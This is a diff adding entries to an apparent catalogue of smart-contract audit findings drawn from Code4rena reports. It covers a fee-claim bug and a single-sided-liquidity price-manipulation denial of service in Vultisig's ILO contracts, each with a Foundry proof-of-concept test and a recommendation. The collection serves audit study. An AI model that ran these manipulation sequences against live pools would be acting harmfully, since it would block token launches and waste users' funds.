@@ -643,6 +643,8 @@ contract CollectFee is Test {
 
 ```
 
+</details>
+
 ## 12.[Medium] Users might be enforced to buy the token from Dex through Tornado which goes against the protocol design
 
 ### Buying from Dex
@@ -651,3 +653,141 @@ contract CollectFee is Test {
 
 - Impact & Recommendation: A flag should be added allowing users to opt out of buying from Dex if the reserve limit is reached.
   <br> 🐬: [Source](https://code4rena.com/reports/2024-06-tornado-launcher-proleague#m-3-Users-might-be-enforced-to-buy-the-token-from-Dex -through-Tornado-which-goes-against-the-protocol-design) & [Report](https://code4rena.com/reports/2024-06-tornado-launcher-proleague)
+
+## 13.[High] Most users won’t be able to claim their share of Uniswap fees
+
+### Unable to claim Uniswap fees
+
+- Summary: The `ILOPool.sol` contract's `claim()` function collects all owed tokens at once, including burnt liquidity and fees for all positions, causing most users to be unable to claim their Uniswap fees. This results in subsequent `claim()` calls containing no Uniswap fees, as they have already been sent to the fee taker, leading to transaction reverts.
+
+- Impact & Recommendation: Modify the `claim()` function to only collect tokens corresponding to the specific `tokenId` position, ensuring that subsequent users can claim their share.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-vultisig#h-01-Most-users-won’t-be-able-to-claim-their-share-of-Uniswap-fees) & [Report](https://code4rena.com/reports/2024-06-vultisig)
+
+<details><summary>POC</summary>
+
+```solidity
+
+function testClaimFeesRevert() external {
+    _launch();
+    vm.warp(VEST_START_0 + 10);
+    uint256 tokenId = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR, 0);
+    uint256 tokenId2 = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR_2, 0);
+    IUniswapV3Pool uniV3Pool = IUniswapV3Pool(projectId);
+    // INVESTOR and INVESTOR_2 burn their liquidity and obtain their tokens
+    vm.prank(INVESTOR);
+    IILOPool(iloPool).claim(tokenId);
+    vm.prank(INVESTOR_2);
+    IILOPool(iloPool).claim(tokenId2);
+    // Generate some fees via a flash loan
+    uniV3Pool.flash(address(this), 1e8, 1e8, "");
+    // INVESTOR claims their corresponding part of the fees
+    // Only the first one to claim has better odds of claiming successfully
+    vm.prank(INVESTOR);
+    IILOPool(iloPool).claim(tokenId);
+    // INVESTOR_2 can't claim their part of the fees as the transaction will revert
+    // It reverts with ST (SafeTransfer) as it is trying to transfer tokens the contract doesn't have
+    // The fees for INVESTOR_2 were already taken
+    vm.prank(INVESTOR_2);
+    vm.expectRevert(bytes("ST"));
+    IILOPool(iloPool).claim(tokenId2);
+    // Generate more fees
+    uniV3Pool.flash(address(this), 1e6, 1e6, "");
+    // Even if some new fees are available, they might not be enough to pay back the owed ones to INVESTOR_2
+    vm.prank(INVESTOR_2);
+    vm.expectRevert(bytes("ST"));
+    IILOPool(iloPool).claim(tokenId2);
+}
+function uniswapV3FlashCallback(uint256, uint256, bytes memory) external {
+    deal(USDC, address(this), IERC20(USDC).balanceOf(address(this)) * 2);
+    deal(SALE_TOKEN, address(this), IERC20(SALE_TOKEN).balanceOf(address(this)) * 2);
+    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
+    IERC20(SALE_TOKEN).transfer(projectId, IERC20(SALE_TOKEN).balanceOf(address(this)));
+}
+
+```
+
+</details>
+
+## 14.[High] Adversary can prevent the launch of any ILO pool with enough raised capital at any moment by providing single-sided liquidity
+
+### Price manipulation
+
+- Summary: An attacker can prevent the launch of an ILO pool, even if it has met its fundraising goal, by manipulating the price of the associated Uniswap v3 pool. This can be done cheaply by adding single-sided liquidity in a way that disrupts the price check in the launch() function of the ILOManager contract. The price discrepancy caused by this manipulation can cause the token launch to fail, leading to a denial-of-service attack.
+
+- Impact & Recommendation: This issue not only disrupts the token launch but also results in wasted gas fees for users and damages the project's reputation. To mitigate this, it is suggested to reserve a buffer amount of tokens in the ILO pool to handle price manipulation or use a wrapper token to maintain price stability.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-vultisig#h-03-Adversary-can-prevent-the-launch-of-any-ILO-pool-with-enough-raised-capital-at-any-moment-by-providing-single-sided-liquidity) & [Report](https://code4rena.com/reports/2024-06-vultisig)
+
+<details><summary>POC</summary>
+
+```solidity
+
+function testManipulatePriceForLaunch() external {
+    IILOManager.InitPoolParams memory params = _getInitPoolParams();
+    _initPool(PROJECT_OWNER, params);
+    assertEq(IUniswapV3Pool(projectId).token0(), USDC);
+    assertEq(IUniswapV3Pool(projectId).token1(), SALE_TOKEN);
+    vm.label(USDC, "USDC");
+    vm.label(SALE_TOKEN, "SALE_TOKEN");
+    vm.label(projectId, "UNI_V3_POOL");
+    vm.label(address(this), "ATTACKER");
+    unsuccessfulPriceManipulation();
+    priceManipulationAttack();
+    vm.warp(LAUNCH_START+1);
+    vm.expectRevert(bytes("UV3P"));
+    iloManager.launch(projectId);
+}
+function unsuccessfulPriceManipulation() internal {
+    uint160 initialPrice = mockProject().initialPoolPriceX96;
+    uint160 MIN_SQRT_RATIO = 4295128739 + 1;
+    // Check price before attack
+    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
+    assertEq(uint256(sqrtPriceX96), initialPrice);
+    // Attack
+    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
+    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
+    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
+    // Mitigation
+    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
+    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
+    assertEq(uint256(sqrtPriceX96), initialPrice);
+}
+function priceManipulationAttack() internal {
+    uint160 initialPrice = mockProject().initialPoolPriceX96;
+    uint160 MIN_SQRT_RATIO = 4295128739 + 1;
+    // Check price before attack
+    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
+    assertEq(uint256(sqrtPriceX96), initialPrice);
+    // Attack -> Swap to manipulate price
+    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
+    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
+    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
+    // Attack -> Mint to prevent swapping back
+    console.log("\n<<Minting Attack>>");
+    deal(USDC, address(this), 1);
+    int24 OUTSIDE_TICK = 0;
+    IUniswapV3Pool(projectId).mint(address(this), OUTSIDE_TICK-10, OUTSIDE_TICK+10, 1, "");
+    // Mitigation doesn't work now
+    // You can uncomment the `expectRevert` and run the test with `-vvvv`
+    // You'll see the log `ATTACKER::uniswapV3SwapCallback(0, 1, 0x)`, which means that it expects 1 wei of SALE_TOKEN
+    // This is not possible as all SALE_TOKENs should be in the ILOPool at this moment
+    console.log("\n<<Failed mitigation attempt>>");
+    vm.expectRevert(bytes("IIA"));
+    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
+    // The price will remain the one set by the attacker
+    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
+    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
+}
+function uniswapV3MintCallback(uint256, uint256, bytes memory) external {
+    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
+}
+function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
+    assertGe(amount0, 0);
+    assertGe(amount1, 0);
+    console.log("\nuniswapV3SwapCallback()");
+    console.log("amount0 (USDC)      ", uint256(amount0));
+    console.log("amount1 (SALE_TOKEN)", uint256(amount1));
+}
+
+```
+
+</details>
